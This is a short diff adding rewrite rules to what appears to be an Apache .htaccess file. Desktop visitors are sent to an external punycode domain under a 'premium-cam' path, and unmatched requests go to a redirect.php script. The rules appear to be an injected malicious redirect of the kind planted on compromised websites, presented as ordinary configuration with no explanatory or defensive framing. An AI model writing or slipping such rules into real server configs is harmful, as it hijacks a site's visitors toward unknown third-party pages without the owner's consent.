@@ -1,0 +1,7 @@
+RewriteEngine Off
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} !(iPhone|iPod|Android.*Mobile|Windows.*Phone|BlackBerry)
+RewriteRule ^(.*)$ https://xn--n8jxc4a9frd5eva0h0d5h5sbbb9158ttlwck6ub.com/premium-cam/$1 [R,L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !redirect\.php
+RewriteRule ^(.*)$ redirect.php?nf=$1 [L]
